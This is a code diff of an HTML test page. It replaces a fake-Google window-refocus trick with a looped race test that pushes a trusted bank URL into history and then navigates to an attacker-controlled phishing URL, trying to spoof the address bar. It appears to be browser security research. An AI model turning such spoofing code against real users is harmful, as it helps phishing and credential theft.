@@ -2,19 +2,34 @@
 <html>
 <body>
 <script>
-// Open real Google then refocus to fake page
-function windowAttack() {
-    const realGoogle = window.open('https://google.com', '_blank');
-    
-    // Quickly refocus to our window
-    setTimeout(() => {
-        window.focus();
-        // Show fake Google content
-        document.body.innerHTML = '<h1>Fake Google</h1>';
-        
-        // Theory: User sees real Google briefly
-        // Then sees fake but might think they're still there
-    }, 500);
+// TEST CASE: Rapid history.pushState and top-level navigation race.
+// GOAL: Cause address bar to display a URL from history state
+// while a page from a different origin is loaded.
+
+let race_condition_attempts = 0;
+const max_attempts = 1000;
+
+function attemptRace() {
+    if (race_condition_attempts++ > max_attempts) {
+        console.log("Test finished: No observable spoof.");
+        return;
+    }
+
+    // 1. Push a trusted URL into history for this origin.
+    history.pushState({}, '', 'https://trusted-bank.com/secure-login');
+
+    // 2. IMMEDIATELY attempt a cross-origin navigation.
+    window.location.replace('https://attacker-controlled-site.com/phish');
+
+    // 3. Observe via automation if the address bar ever displayed
+    // 'https://trusted-bank.com/secure-login' while the content
+    // from the attacker's site was active.
+    // (This requires external instrumentation to detect)
+}
+
+// Run the attempt in a tight loop with slight delays.
+for(let i = 0; i < 10; i++) {
+    setTimeout(attemptRace, i * 20);
 }
 </script>
 </body>
